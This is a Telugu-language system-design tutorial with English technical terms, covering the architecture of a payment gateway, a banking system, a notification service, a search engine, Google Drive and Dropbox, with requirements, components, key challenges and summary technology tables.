**Payment Gateway (పేమెంట్ గేట్‌వే)** అనేది సిస్టమ్ డిజైన్‌లో అత్యంత సున్నితమైన మరియు క్లిష్టమైన భాగం. ఎందుకంటే ఇందులో **"డబ్బు"** మరియు **"సెక్యూరిటీ"** ఉంటాయి. దీనిని డిజైన్ చేసేటప్పుడు మనం **ACID Properties (Atomicity, Consistency, Isolation, Durability)** కి అత్యంత ప్రాధాన్యత ఇవ్వాలి.

దీనిని మనం 4 ముఖ్యమైన భాగాలుగా విడదీద్దాం:

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* యూజర్ కార్డు/UPI/వాలెట్ వివరాలను ప్రాసెస్ చేయడం.
- బ్యాంక్ (Issuer) తో కమ్యూనికేట్ చేయడం.
- సక్సెస్/ఫెయిల్యూర్ రెస్పాన్స్ పంపడం.

- **Non-Functional:**
- **Security (PCI-DSS Compliance):** డేటా ఎన్క్రిప్షన్ (Encryption) తప్పనిసరి.
- **High Reliability:** ఒక చిన్న పొరపాటు కూడా జరగకూడదు (Money deduct అవ్వడం, కానీ ఆర్డర్ ఫెయిల్ అవ్వడం లాంటివి).
- **Latency:** బ్యాంక్ నుండి రెస్పాన్స్ వచ్చే వరకు యూజర్ వెయిట్ చేయాలి.

---

### 2. High-Level Design (ముఖ్య భాగాలు)

1. **Payment API Service:** క్లయింట్ నుండి రిక్వెస్ట్ తీసుకునే సర్వీస్.
2. **Ledger Service:** ప్రతి లావాదేవీని (Transaction) లెక్కపెట్టే సర్వీస్.
3. **Transaction Processor:** బ్యాంక్ గేట్‌వేలతో కమ్యూనికేట్ చేసే సర్వీస్.
4. **Vault (Encryption):** కార్డు వివరాలు, పిన్ వంటి సున్నితమైన డేటాను దాచుకోవడానికి.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Atomic Transactions (The "Double Spend" Problem)

ఒక యూజర్ ₹500 పేమెంట్ చేస్తే, ఆ అమౌంట్ డెబిట్ అవ్వాలి మరియు మర్చంట్ కి క్రెడిట్ అవ్వాలి.

- **Problem:** డెబిట్ అయ్యి, క్రెడిట్ అవ్వకపోయినా లేదా ఏదైనా మధ్యలో ఆగిపోయినా ప్రాబ్లం.
- **Solution:** మనం **Two-Phase Commit (2PC)** లేదా **Saga Pattern** వాడాలి. లావాదేవీ మొత్తం జరిగితేనే `Commit`, లేదంటే `Rollback` జరగాలి.

#### B. Idempotency (The Most Important Concept)

యూజర్ "Pay" బటన్ మీద 2 సార్లు క్లిక్ చేస్తే? లేదా ఇంటర్నెట్ పోయి మళ్ళీ క్లిక్ చేస్తే?

- **Solution:** **Idempotency Key**. ప్రతి రిక్వెస్ట్ కి ఒక యూనిక్ ఐడి (UUID) ఉంటుంది. సర్వర్ ఆ ఐడిని చెక్ చేస్తుంది: "ఈ ఐడితో ఇదివరకే పేమెంట్ జరిగిందా?" అని. జరిగితే మళ్ళీ ప్రాసెస్ చేయదు, పాత రిజల్ట్ మాత్రమే చూపిస్తుంది. ఇది లేకపోతే డబ్బులు డబుల్ కట్ అవుతాయి.

#### C. Security

- **Tokenization:** క్లయింట్ ఇచ్చే కార్డు నంబర్లను ఎప్పుడూ సర్వర్ లో సేవ్ చేయకూడదు. వాటిని ఒక 'Token' లాగా మారుస్తాం. బ్యాంక్ గేట్‌వేకి టోకెన్ మాత్రమే వెళ్తుంది.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **Request:** యూజర్ పేమెంట్ ఐడి ని క్రియేట్ చేస్తాడు (Idempotency Keyతో).
2. **Validation:** మన సర్వీస్ ఆ ఐడి ని చెక్ చేసి, అది కొత్తదా కాదా అని చూస్తుంది.
3. **External Call:** మన సిస్టమ్ బ్యాంక్/గేట్‌వే (Razorpay/Stripe) ని కనెక్ట్ అవుతుంది.
4. **Webhook:** బ్యాంక్ సర్వర్ నుండి పేమెంట్ స్టేటస్ (Success/Fail) మనకు వస్తుంది (**Webhook** ద్వారా).
5. **Final Update:** మన సిస్టమ్ ఆర్డర్ స్టేటస్ అప్‌డేట్ చేసి, యూజర్‌కి కన్ఫర్మేషన్ పంపుతుంది.

---

### 5. Bottlenecks & Solutions

1. **Network Timeout:** బ్యాంక్ నుండి రెస్పాన్స్ రాకపోతే?

- **Solution:** రిక్వెస్ట్ ని ఒక 'Pending' స్టేట్ లో పెట్టి, క్యూ (Kafka) ద్వారా **Retry Mechanism** రన్ చేయాలి. బ్యాంక్ ని అడిగి (Status Query) స్టేటస్ కన్ఫర్మ్ చేసుకోవాలి.

2. **High Load:** ఒకేసారి లక్షల రిక్వెస్టులు వస్తే?

- **Solution:** అసింక్రోనస్ క్యూ (Kafka) వాడటం వల్ల పేమెంట్స్ లైన్ లో ఉండి ప్రాసెస్ అవుతాయి. సిస్టమ్ క్రాష్ అవ్వదు.

---

### Summary Architecture Table

| భాగం                 | టెక్నాలజీ            | పని                                  |
| -------------------- | -------------------- | ------------------------------------ |
| **Idempotency**      | Redis                | డూప్లికేట్ పేమెంట్స్ ని ఆపడం.        |
| **Transaction Flow** | Kafka / Event-Driven | పేమెంట్ ప్రాసెసింగ్‌ని స్కేల్ చేయడం. |
| **Security**         | AES-256 Encryption   | డేటాని ఎన్క్రిప్ట్ చేయడం.            |
| **Status Update**    | Webhooks             | రియల్-టైమ్ పేమెంట్ అప్‌డేట్స్.       |

---

## Banking System

**Banking System** డిజైన్ చేయడం అంటే ప్రపంచంలోనే అత్యంత కఠినమైన సిస్టమ్ డిజైన్ సవాళ్లలో ఒకటి. ఎందుకంటే ఇక్కడ **"Financial Accuracy" (ఖచ్చితత్వం)**, **"Security"**, మరియు **"Consistency" (డేటా మారకుండా ఉండటం)** అత్యంత కీలకం.

దీనిని మనం **"Core Banking System"** ఆర్కిటెక్చర్ కోణంలో చూద్దాం.

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* అకౌంట్ ఓపెనింగ్, KYC వెరిఫికేషన్.
- ఫండ్ ట్రాన్స్‌ఫర్ (ఇంటర్నల్, NEFT, IMPS, RTGS).
- బ్యాలెన్స్ ఎంక్వైరీ, స్టేట్‌మెంట్స్.
- ఆడిటింగ్ (ఏ ట్రాన్సాక్షన్ ఎప్పుడు జరిగింది అనేది రికార్డు ఉండాలి).

- **Non-Functional:**
- **Strong Consistency:** డబ్బులు డెబిట్ అవ్వడం మరియు క్రెడిట్ అవ్వడం ఒకేసారి జరగాలి (ACID).
- **Security & Compliance:** కఠినమైన ఎన్‌క్రిప్షన్ మరియు రెగ్యులేటరీ నిబంధనలు.
- **High Availability:** సిస్టమ్ ఎప్పుడూ అందుబాటులో ఉండాలి.

---

### 2. High-Level Design (ముఖ్య భాగాలు)

1. **Account Service:** యూజర్ అకౌంట్ వివరాలు, ప్రొఫైల్ మేనేజ్మెంట్.
2. **Transaction Service:** డబ్బు పంపడం, తీసుకోవడం (ఇది మెయిన్ సర్వీస్).
3. **Ledger Service:** అకౌంట్ లో ఎంత ఉంది, ఏమేమి లావాదేవీలు జరిగాయి అనేది అకౌంటింగ్ బుక్ (Double-entry bookkeeping).
4. **Notification Service:** ట్రాన్సాక్షన్ జరిగినప్పుడు SMS/Email పంపడం.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Double-Entry Bookkeeping (ఖచ్చితత్వం కోసం)

బ్యాంకింగ్ సిస్టమ్ ఎప్పుడూ **Double-entry** పద్ధతిని వాడుతుంది. అంటే ఒకరి ఖాతాలో ₹100 తగ్గితే, అది కచ్చితంగా ఇంకొకరి ఖాతాలో లేదా ఫీజుల ఖాతాలో చేరాలి.

- **Ledger Table:** ప్రతి ట్రాన్సాక్షన్‌కు ఒక `Debit` ఎంట్రీ మరియు ఒక `Credit` ఎంట్రీ ఉండాలి. టోటల్ ఎప్పుడూ జీరో అవ్వాలి (Assets - Liabilities = Equity).

#### B. Distributed Transactions (Saga Pattern)

ఒక బ్యాంక్ అకౌంట్ నుండి మరొక బ్యాంక్ అకౌంట్‌కు డబ్బులు వెళ్లడం (Inter-bank transfer) చాలా పెద్ద ప్రక్రియ. ఇక్కడ మనం **Saga Pattern** వాడాలి:

- **Step 1:** సోర్స్ బ్యాంక్ అకౌంట్‌లో అమౌంట్ 'Hold' చేయాలి.
- **Step 2:** డెస్టినేషన్ బ్యాంక్ అకౌంట్‌కు 'Credit' మెసేజ్ పంపాలి.
- **Step 3:** ఒకవేళ స్టెప్ 2 ఫెయిల్ అయితే, స్టెప్ 1 లో ఆపిన అమౌంట్‌ని మళ్ళీ రిలీజ్ చేయాలి (Compensating Transaction).

#### C. Database Strategy

- **SQL (RDBMS):** బ్యాంకింగ్‌లో **ACID** లక్షణాలు చాలా ముఖ్యం. కాబట్టి **PostgreSQL/Oracle** లాంటి రిలేషనల్ డేటాబేస్లే బెస్ట్. NoSQL ని వాడకూడదు.
- **Consistency:** **Strong Consistency** ఉండాలి. అంటే ఒక డేటాబేస్ అప్‌డేట్ అయితే, అది వెంటనే అందరికీ కనిపించాలి.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **Request:** యూజర్ "Transfer Money" రిక్వెస్ట్ పంపుతాడు.
2. **Validation:** అకౌంట్ యాక్టివ్‌గా ఉందా? బ్యాలెన్స్ సరిపోతుందా? అని చెక్ చేస్తుంది.
3. **Ledger Entry:** `Debit` మరియు `Credit` ఎంట్రీలను లెడ్జర్‌లో రాస్తుంది (Transaction Begin).
4. **Persistence:** డేటాబేస్ లో సేవ్ చేస్తుంది (Transaction Commit).
5. **Notification:** లావాదేవీ సక్సెస్ అయిన వెంటనే ఎస్ఎంఎస్ పంపుతుంది.

---

### 5. Bottlenecks & Solutions

1. **Concurrency (Race Condition):** ఒకే అకౌంట్‌ నుండి ఒకేసారి ఇద్దరు వ్యక్తులు డబ్బులు తీయడానికి ట్రై చేస్తే?

- **Solution:** **Pessimistic Locking** వాడాలి. అంటే ఒక ట్రాన్సాక్షన్ జరుగుతున్నప్పుడు ఆ అకౌంట్ రో (Row) లాక్ అవుతుంది.

2. **Audit Trails:** బ్యాంకింగ్ లో ఎవరైనా మార్పులు చేస్తే అది కచ్చితంగా తెలియాలి. దీని కోసం ప్రతి అకౌంట్ లో **Immutable Audit Logs** (కేవలం రాసే అవకాశం ఉన్న, మార్చే అవకాశం లేని రికార్డులు) మెయింటెన్ చేస్తారు.
3. **Security:** ప్రతి ట్రాన్సాక్షన్ ని **MFA (Multi-factor Authentication)** మరియు ఎన్క్రిప్షన్ ద్వారా రక్షిస్తాము.

---

### Summary Architecture Table

| భాగం             | టెక్నాలజీ                 | పని                                           |
| ---------------- | ------------------------- | --------------------------------------------- |
| **Database**     | PostgreSQL / Oracle       | ACID Compliant స్టోరేజ్.                      |
| **Transactions** | Saga Pattern              | ఫెయిల్యూర్స్ ఉన్నప్పుడు డేటాని కరెక్ట్ చేయడం. |
| **Security**     | Hardware Security Modules | కీలు, పాస్‌వర్డ్స్ దాచడానికి.                 |
| **Audit**        | Write-Ahead Log (WAL)     | ప్రతి మార్పును రికార్డ్ చేయడం.                |

---

## Notification Service

**Notification Service** అనేది ఏదైనా మోడరన్ అప్లికేషన్‌లో యూజర్ ఎంగేజ్మెంట్ కోసం అత్యంత కీలకమైన భాగం. ఇది ఎస్ఎంఎస్ (SMS), ఈమెయిల్ (Email), పుష్ నోటిఫికేషన్లు (Push Notifications - FCM/APNS) వంటి వివిధ ఛానల్స్ ద్వారా యూజర్లకు సమాచారాన్ని పంపుతుంది.

దీనిని మనం ఎలా డిజైన్ చేయాలో చూద్దాం:

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* బహుళ ఛానల్స్ (Email, SMS, Push, Slack, Discord) సపోర్ట్.
- యూజర్ సెట్టింగ్స్ (నోటిఫికేషన్లు ఆన్/ఆఫ్ చేసుకోవడం).
- మెసేజ్ టెంప్లేట్స్ మేనేజ్మెంట్.

- **Non-Functional:**
- **High Reliability:** ఒక నోటిఫికేషన్ కూడా మిస్ అవ్వకూడదు (At-least-once delivery).
- **Scalability:** పండుగ సీజన్లలో లక్షల మెసేజ్‌లు ఒకేసారి పంపాల్సి రావచ్చు.
- **Low Latency:** యాక్షన్ జరిగిన వెంటనే (ఉదా: పాస్‌వర్డ్ రీసెట్) మెసేజ్ వెళ్లాలి.

---

### 2. High-Level Design (ముఖ్య భాగాలు)

1. **Notification API Service:** ఇతర సర్వీసెస్ నుండి నోటిఫికేషన్ రిక్వెస్టులను స్వీకరిస్తుంది.
2. **Notification Worker:** మెసేజ్‌లను ప్రాసెస్ చేసి, సరైన ఛానల్‌కి పంపుతుంది.
3. **Template Engine:** మెసేజ్ కంటెంట్‌ని డైనమిక్‌గా క్రియేట్ చేయడానికి.
4. **Message Broker (Kafka/RabbitMQ):** ఇది సిస్టమ్‌కి వెన్నెముక. లోడ్ పెరిగినప్పుడు మెసేజ్‌లను క్యూలో ఉంచుతుంది.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Architecture Flow

1. **Producer:** ఏదైనా ఒక సర్వీస్ (ఉదా: Order Service) మెసేజ్‌ని పంపుతుంది.
2. **Broker:** మెసేజ్ క్యూ (Kafka) లోకి వెళ్తుంది.
3. **Worker:** క్యూ నుండి మెసేజ్‌ను తీసుకుని, యూజర్ ఏ ఛానల్ ఎంచుకున్నాడో (Email/SMS) చూస్తుంది.
4. **Provider:** ఆ ఛానల్ కి సంబంధించిన థర్డ్ పార్టీ ప్రొవైడర్ (SendGrid, Twilio, Firebase) కి మెసేజ్ పంపుతుంది.

#### B. Rate Limiting

ఒక యూజర్‌కి ఒక నిమిషంలో 100 ఈమెయిళ్లు వెళ్తే అది స్పామ్ అవుతుంది.

- **Solution:** **Redis** వాడి, ప్రతి యూజర్‌కి ఒక కౌంటర్ పెడతాం. లిమిట్ దాటితే ఆ నోటిఫికేషన్లను డిస్కార్డ్ చేయాలి లేదా హోల్డ్ చేయాలి.

#### C. Reliability (Message Delivery)

మెసేజ్ ప్రొవైడర్ (ఉదా: Twilio) డౌన్ అయితే ఏం చేయాలి?

- **Solution:** **Retry Mechanism (Exponential Backoff)** వాడాలి. ఒకసారి ఫెయిల్ అయితే, 1 నిమిషం తర్వాత, మళ్ళీ 5 నిమిషాల తర్వాత.. ఇలా ట్రై చేస్తాం. ఏదీ కుదరకపోతే **Dead Letter Queue (DLQ)** లోకి పంపి, తర్వాత మాన్యువల్‌గా చెక్ చేస్తాం.

---

### 4. Database Strategy

- **Message Table:** ఏ యూజర్‌కి, ఏ మెసేజ్, ఏ స్టేటస్‌లో (Sent, Failed, Pending) ఉంది?
- **User Settings:** ఏ యూజర్ ఏ నోటిఫికేషన్లను ఆఫ్ చేసుకున్నారు? (దీనిని **Redis** లో క్యాష్ చేయాలి, ఎందుకంటే ప్రతి మెసేజ్ కి డేటాబేస్ ని అడగలేము).

---

### 5. Summary Architecture Table

| భాగం                 | టెక్నాలజీ              | పని                           |
| -------------------- | ---------------------- | ----------------------------- |
| **Buffering**        | Kafka / RabbitMQ       | భారీ లోడ్‌ని హ్యాండిల్ చేయడం. |
| **Logic/Processing** | Workers (Go/Java/Node) | టెంప్లేట్ తయారీ, రూటింగ్.     |
| **Rate Limiter**     | Redis                  | స్పామ్ ని నివారించడం.         |
| **Storage**          | Cassandra / PostgreSQL | మెసేజ్ హిస్టరీ/స్టేటస్.       |

---

### ఆర్కిటెక్ట్ సలహా:

నోటిఫికేషన్ సిస్టమ్ లో **"Idempotency"** చాలా ముఖ్యం. అంటే ఒకే నోటిఫికేషన్ రెండుసార్లు వెళ్లకూడదు. దీని కోసం ఒక **Message ID** ని కచ్చితంగా వాడాలి.

---

## Search Engine

**Search Engine (గూగుల్ వంటి సెర్చ్ ఇంజిన్)** డిజైన్ చేయడం అనేది సిస్టమ్ డిజైన్‌లో అత్యంత భారీ మరియు సవాలుతో కూడిన పని. దీనిని కేవలం ఒక యాప్ లాగా కాకుండా, ఒక **"ఇంటర్నెట్ స్కేల్" (Internet Scale)** ప్రాజెక్టుగా చూడాలి.

దీనిని 4 ప్రధాన దశల్లో (Pipeline) విభజించవచ్చు:

---

### 1. Crawler (వెబ్‌ను తిరిగే రోబో)

ఇంటర్నెట్‌లో ఉన్న బిలియన్ల కొద్దీ వెబ్ పేజీలను ఇది సేకరిస్తుంది.

- **Seed URLs:** మొదట కొన్ని ఫేమస్ సైట్ల నుండి మొదలుపెట్టి, వాటిలోని లింక్స్ ద్వారా ఇతర పేజీలకు వెళ్తుంది.
- **Politeness:** ఒకే సర్వర్‌ని నిరంతరం హిట్ చేయకూడదు (అలా చేస్తే DDoS అటాక్ లాగా భావించి బ్లాక్ చేస్తారు). కాబట్టి, ప్రతి వెబ్‌సైట్ కి కొంత సమయం ఇచ్చి క్రాల్ చేస్తుంది.
- **Storage:** క్రాల్ చేసిన కంటెంట్‌ను **Raw HTML** రూపంలో **Blob Storage (S3/GCS)** లో దాచుకుంటుంది.

### 2. Indexer (డేటాను అర్థం చేసుకోవడం)

సేకరించిన HTML నుండి పనికిరాని విషయాలను (CSS, Scripts) తొలగించి, ముఖ్యమైన పదాలను ఎక్స్‌ట్రాక్ట్ చేస్తుంది.

- **Inverted Index:** ఇది సెర్చ్ ఇంజిన్ యొక్క గుండెకాయ.
- ఉదా: "Apple" అనే పదం ఏయే వెబ్ పేజీల్లో ఉందో ఆ పేజీల లిస్టును ఇది ఒక మ్యాప్ లాగా దాచుకుంటుంది.
- **Key:** Word, **Value:** List of Document IDs.

- **Normalization:** "Running", "Ran", "Runs" అనే పదాలన్నింటినీ "Run" అని ఒకేలా మారుస్తుంది (Stemming).

### 3. Ranking System (సరైన పేజీని పైన చూపడం)

యూజర్ సెర్చ్ చేసినప్పుడు వేల పేజీలు వస్తాయి, వాటిలో ఏది బెస్ట్ అనేది ఇది డిసైడ్ చేస్తుంది.

- **PageRank Algorithm:** ఒక పేజీకి ఎన్ని ఎక్కువ వెబ్‌సైట్ల నుండి లింక్స్ (Backlinks) వస్తున్నాయో, దానికి అంత ఎక్కువ "Authority" ఉంటుందని భావిస్తుంది.
- **Signals:** కంటెంట్ క్వాలిటీ, కీవర్డ్ డెన్సిటీ, యూజర్ క్లిక్ రేటు (CTR), లోడింగ్ స్పీడ్.. వీటన్నింటినీ బట్టి ర్యాంక్ ఇస్తుంది.

### 4. Query Service (రిజల్ట్స్ చూపడం)

యూజర్ టైప్ చేయగానే సెకనులో వంద వంతు కాలంలో రిజల్ట్స్ చూపాలి.

- **Distributed Search:** ఇన్వర్టెడ్ ఇండెక్స్ చాలా పెద్దది కాబట్టి, దాన్ని వేల సర్వర్లలో **Shard (ముక్కలు)** చేస్తారు. సెర్చ్ రిక్వెస్ట్ అన్ని సర్వర్లకు వెళ్లి, అక్కడి నుండి వచ్చిన రిజల్ట్స్ ని "Merge" చేసి యూజర్‌కి చూపిస్తుంది.

---

### 5. సవాళ్లు & పరిష్కారాలు

| సవాలు              | పరిష్కారం                                                                    |
| ------------------ | ---------------------------------------------------------------------------- |
| **Data Size**      | **Compression:** ఇండెక్స్ డేటాను బాగా కంప్రెస్ చేయాలి.                       |
| **Fast Retrieval** | **Caching:** బాగా వెతికే కీవర్డ్స్ ని Redis లో ఉంచాలి.                       |
| **Spam**           | **Spam Detection:** ఫేక్ వెబ్‌సైట్లను ఫిల్టర్ చేయడానికి ప్రత్యేక ML మోడల్స్. |
| **Scalability**    | **MapReduce/Spark:** ఇండెక్సింగ్ ప్రాసెస్ మొత్తం ప్యారలల్‌గా జరగాలి.         |

---

### Summary Architecture Flow

1. **Crawler:** వెబ్ నుండి పేజీలను తెస్తుంది.
2. **Parser:** టెక్స్ట్‌ని విడగొడుతుంది.
3. **Indexer:** ఇన్వర్టెడ్ ఇండెక్స్ క్రియేట్ చేస్తుంది.
4. **Ranking:** పేజీలకు స్కోర్ ఇస్తుంది.
5. **Search:** యూజర్ అడిగినప్పుడు ఇండెక్స్ లో వెతికి రిజల్ట్స్ పంపుతుంది.

---

**ముగింపు:** సెర్చ్ ఇంజిన్ డిజైన్ అనేది **"Scalability"** మరియు **"Algorithms"** యొక్క కలయిక. మీరు ఇక్కడ నేర్చుకున్న **Inverted Index** అనేది ఈ మొత్తం సిస్టమ్ లో అత్యంత ఇంపార్టెంట్ టెక్నికల్ పాయింట్.

---

## Google Drive

**Google Drive** లాంటి క్లౌడ్ స్టోరేజ్ సిస్టమ్ డిజైన్ చేయడం అంటే **"High Availability"**, **"Scalability"**, మరియు **"Data Consistency"** ల మధ్య బ్యాలెన్స్ సాధించడం. ఇది కేవలం ఫైల్స్ అప్‌లోడ్ చేయడం మాత్రమే కాదు, వాటిని ఎలా మేనేజ్ చేస్తాం అనేది ముఖ్యం.

దీనిని 4 ప్రధాన భాగాలుగా విభజిద్దాం:

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* ఫైల్ అప్‌లోడ్/డౌన్‌లోడ్.
- ఫైల్ షేరింగ్ (లింక్స్ ద్వారా).
- ఫైల్ వెర్షన్ కంట్రోల్ (పాత వెర్షన్లు చూడటం).
- సెర్చ్ (ఫైల్ నేమ్ లేదా కంటెంట్ ద్వారా).

- **Non-Functional:**
- **High Durability:** ఫైల్ అస్సలు డిలీట్ అవ్వకూడదు (99.999999999% durability).
- **Scalability:** పెటాబైట్ల కొద్దీ డేటా నిల్వ చేయాలి.
- **Low Latency:** ప్రపంచంలో ఎక్కడి నుండి డౌన్‌లోడ్ చేసినా వేగంగా రావాలి.

---

### 2. High-Level Design (ముఖ్య భాగాలు)

1. **Block Storage Service:** ఫైల్స్ చాలా పెద్దవిగా ఉంటాయి. కాబట్టి మనం ఫైల్‌ను చిన్న చిన్న **Blocks** (ఉదా: 4MB ముక్కలు) గా విడగొడతాం.
2. **Metadata Service (Database):** ఫైల్ పేరు, పాత్ (Path), వెర్షన్, యూజర్ ఐడి, ఏ బ్లాక్స్ ఎక్కడ ఉన్నాయో అనేది ఇక్కడ ఉంటుంది.
3. **Chunking Service:** అప్‌లోడ్ చేసేటప్పుడు ఫైల్‌ను ముక్కలు చేయడం, డౌన్‌లోడ్ చేసేటప్పుడు వాటిని కలపడం.
4. **Sync Service:** ఒక డివైస్‌లో మార్పు చేస్తే, అది అన్ని డివైస్‌లలో (Mobile/PC) అప్‌డేట్ అవ్వడం.

---

### 3. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Chunking & Storage

ఫైల్స్ ని డైరెక్ట్‌గా సర్వర్ లో సేవ్ చేయము.

- **Chunking:** ప్రతి ఫైల్‌ను చిన్న ముక్కలు చేసి, వాటిని **Content-Addressable Storage** (హ్యాష్ వాల్యూ ఆధారంగా) లో దాచుతాము.
- **Deduplication:** ఇద్దరు యూజర్లు ఒకే ఫైల్‌ను అప్‌లోడ్ చేస్తే, సర్వర్ లో ఒక కాపీ మాత్రమే ఉంటుంది. దీనివల్ల చాలా స్పేస్ ఆదా అవుతుంది.

#### B. Metadata vs Data

- **Data (The Blocks):** S3 లేదా Google Cloud Storage వంటి **Object Storage** లలో దాచుకుంటాం (ఇది చాలా చౌక).
- **Metadata (The Map):** ఫైల్ ఏ బ్లాక్ ఎక్కడ ఉందో చెప్పే మ్యాపింగ్ కోసం **Cassandra/DynamoDB** (NoSQL) వాడతాం, ఎందుకంటే ఇది చాలా ఫాస్ట్ గా ఉంటుంది.

#### C. Syncing & Conflict Resolution

ఒకే ఫైల్‌ను ఇద్దరు వేర్వేరు చోట్ల ఎడిట్ చేస్తే?

- **Solution:** **Versioning.** ప్రతి ఎడిట్ ఒక కొత్త వెర్షన్ లాగా సేవ్ అవుతుంది. యూజర్ చివరగా చేసిన ఎడిట్ ని 'Current' గా సెట్ చేస్తాం.

---

### 4. ఆర్కిటెక్చర్ ఫ్లో

1. **Upload:** యూజర్ ఫైల్ అప్‌లోడ్ చేస్తాడు -> **Chunking Service** ముక్కలు చేస్తుంది -> ముక్కలను **Object Storage** లో పెడుతుంది.
2. **Metadata:** **Metadata Service** ఆ ఫైల్ యొక్క వివరాలు మరియు ముక్కల అడ్రస్ ని **Database** లో అప్‌డేట్ చేస్తుంది.
3. **Download:** యూజర్ డౌన్‌లోడ్ కోరగానే -> **Metadata Service** ముక్కల అడ్రస్ ఇస్తుంది -> అన్ని ముక్కలను కలిపి ఫైల్ ని యూజర్‌కి పంపుతుంది.

---

### 5. Bottlenecks & Solutions

1. **Network Failure:** అప్‌లోడ్ మధ్యలో కట్ అయితే?

- **Solution:** **Resumable Uploads.** ముక్కలు ముక్కలుగా అప్‌లోడ్ చేస్తున్నాం కాబట్టి, ఎక్కడ కట్ అయిందో అక్కడి నుండే మళ్ళీ స్టార్ట్ చేయవచ్చు.

2. **Search:** ఫైల్స్ లోపల ఉన్న కంటెంట్ వెతకాలి (ఉదా: Google Docs లోని పదాలు).

- **Solution:** **Indexing Service.** బ్యాక్-గ్రౌండ్ లో ఒక సర్వీస్ ఫైల్స్ ని చదివి, **Elasticsearch** లో ఇండెక్స్ చేస్తుంది.

---

### Summary Architecture Table

| భాగం               | టెక్నాలజీ          | పని                                  |
| ------------------ | ------------------ | ------------------------------------ |
| **Object Storage** | S3 / GCS           | ఫైల్ ముక్కల స్టోరేజ్.                |
| **Metadata**       | Cassandra          | ఫైల్ ఐడి, వెర్షన్, లొకేషన్ వివరాలు.  |
| **Syncing**        | WebSockets / Kafka | డివైస్ ల మధ్య రియల్ టైమ్ అప్‌డేట్స్. |
| **Search**         | Elasticsearch      | ఫైల్ కంటెంట్ ఇండెక్సింగ్ & సర్చ్.    |

---

## Dropbox

**Dropbox** డిజైన్ అనేది గూగుల్ డ్రైవ్ లాంటిదే, కానీ ఇందులో అత్యంత ముఖ్యమైన అంశం **"Sync Engine" (సింక్రోనైజేషన్)**. డ్రాప్‌బాక్స్ ఎలా పనిచేస్తుందో ఒక సీనియర్ ఆర్కిటెక్ట్ దృష్టికోణంలో చూద్దాం.

---

### 1. Requirements (అవసరాలు)

- **Functional:** \* **Block-level sync:** ఫైల్‌లో చిన్న మార్పు చేస్తే, మొత్తం ఫైల్‌ని కాకుండా, కేవలం ఆ 'బ్లాక్'ని మాత్రమే సింక్ చేయడం.
- **Offline Access:** ఇంటర్నెట్ లేనప్పుడు చేసిన మార్పులను, ఆన్‌లైన్ రాగానే సింక్ చేయడం.
- **Versioning:** పాత ఫైల్ వెర్షన్లను రిస్టోర్ చేసుకోవడం.

- **Non-Functional:**
- **Efficiency:** బ్యాండ్‌విడ్త్ ఆదా చేయడం.
- **Consistency:** అన్ని డివైస్‌లలో ఒకే ఫైల్ స్టేట్ ఉండటం.

---

### 2. Deep Dive (ముఖ్యమైన సవాళ్లు)

#### A. Block-level Sync (డ్రాప్‌బాక్స్ సక్సెస్ సీక్రెట్)

ఒక 1GB ఫైల్‌లో మీరు ఒక పదం మార్చితే, మళ్ళీ 1GB అప్‌లోడ్ చేయడం వేస్ట్.

- **డ్రాప్‌బాక్స్ పద్ధతి:** ఫైల్‌ను 4MB ముక్కలుగా (Blocks) విడగొడుతుంది. ప్రతి ముక్కకు ఒక **Hash** (SHA-256) ఉంటుంది.
- మీరు ఫైల్‌లో మార్పు చేసినప్పుడు, ఏ ముక్క (Block) మారిందో సర్వర్ గుర్తిస్తుంది. ఆ ముక్కను మాత్రమే అప్‌లోడ్ చేస్తుంది. దీనివల్ల సింకింగ్ చాలా ఫాస్ట్ గా ఉంటుంది.

#### B. The Sync Engine (Client-Server Relationship)

- **Client (App):** ప్రతి డివైస్‌లో ఒక "Watcher" సర్వీస్ ఉంటుంది. ఫైల్ సిస్టమ్‌లో ఏదైనా మార్పు (Create/Update/Delete) జరిగితే, వెంటనే అది సర్వర్‌కి ఒక **"Delta"** (కేవలం జరిగిన మార్పు మాత్రమే) పంపుతుంది.
- **Server:** డెల్టా అప్‌డేట్ రాగానే, ఆ మార్పును డేటాబేస్ లో అప్‌డేట్ చేసి, అదే ఫైల్ ఉన్న మిగతా డివైస్‌లకు **Notification (WebSocket)** పంపుతుంది.

#### C. Conflict Resolution

ఇద్దరు యూజర్లు ఒకే ఫైల్‌ను ఆఫ్-లైన్‌లో ఎడిట్ చేస్తే?

- **Solution:** **"Conflicted Copy"** క్రియేట్ చేస్తుంది. "File.txt" ని అప్‌డేట్ చేస్తే, మరొకటి "File (User B's conflicted copy).txt" గా సేవ్ అవుతుంది. ఇది డేటా పోకుండా చూసే సేఫ్టీ పద్ధతి.

---

### 3. ఆర్కిటెక్చర్ ఫ్లో

1. **Change:** యూజర్ ఫైల్ సేవ్ చేయగానే, క్లయింట్ యాప్ ఫైల్‌ను బ్లాక్స్ గా విడగొట్టి, మారిన బ్లాక్ ని కనుగొంటుంది.
2. **Upload:** మారిన బ్లాక్ మరియు మెటాడేటా మాత్రమే **Server** కి వెళ్తాయి.
3. **Persist:** సర్వర్ ఆ బ్లాక్‌ను స్టోర్ చేస్తుంది, మెటాడేటాను **Metadata DB** లో అప్‌డేట్ చేస్తుంది.
4. **Notify:** వేరే డివైస్‌లకు "File updated" అని **Notification** పంపుతుంది.
5. **Sync:** వేరే డివైస్ ఆ మెసేజ్ అందుకుని, సర్వర్ నుండి ఆ కొత్త బ్లాక్‌ని డౌన్‌లోడ్ చేసుకుని, పాత ఫైల్‌తో "Patch" (కలుపుతుంది) చేస్తుంది.

---

### 4. Summary Table

| కాన్సెప్ట్      | టెక్నాలజీ/పద్ధతి         | లాభం                                         |
| --------------- | ------------------------ | -------------------------------------------- |
| **Bandwidth**   | Block-level syncing      | డేటా చాలా తక్కువ ఖర్చవుతుంది.                |
| **Syncing**     | WebSockets/Delta updates | రియల్ టైమ్ అప్‌డేట్స్.                       |
| **Storage**     | Object Storage (S3)      | ఫైల్ బ్లాక్స్ స్టోరేజ్.                      |
